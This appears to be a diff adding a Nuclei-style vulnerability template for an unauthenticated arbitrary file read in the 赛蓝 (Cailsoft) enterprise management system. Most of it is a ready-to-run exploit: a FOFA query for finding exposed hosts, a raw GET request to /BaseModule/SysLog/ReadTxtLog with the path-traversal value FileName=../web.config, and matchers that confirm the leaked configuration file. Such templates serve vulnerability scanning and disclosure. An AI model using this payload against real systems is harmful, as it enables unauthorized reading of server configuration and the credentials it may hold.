@@ -1,0 +1,33 @@
+id: NPoc-8
+
+info:
+  name: 赛蓝企业管理系统ReadTxtLog存在任意文件读取漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    赛蓝企业管理系统是一款为企业提供全面管理解决方案的软件系统，它能够帮助企业实现精细化管理，提高效率，降低成本。系统集成了多种管理功能，包括但不限于项目管理、财务管理、采购管理、销售管理以及报表分析等，旨在为企业提供一站式的管理解决方案。该系统以先进的管理思想为引导，结合企业实际业务流程，通过信息化手段提升企业管理水平。赛蓝企业管理系统ReadTxtLog接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+  tags: download
+request:
+ - raw:
+      - |
+        GET /BaseModule/SysLog/ReadTxtLog?FileName=../web.config HTTP/1.1
+        Host: {{RootURL}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Cookie: __RequestVerificationToken=EXiOGTuudShJEzYLR8AQgWCZbF2NB6_KXKrmqJJyp1cgyV6_LYy9yKQhNkHJGXXlbO_6NLQZPwUUdVZKH6e9KMuXyxV6Tg-w5Ftx-mKih3U1; ASP.NET_SessionId=2ofwed0gd2jc4paj0an0hpcl
+        Priority: u=0, i
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+   matchers-condition: and
+   matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
+          - 'configSections'
+        condition: and   
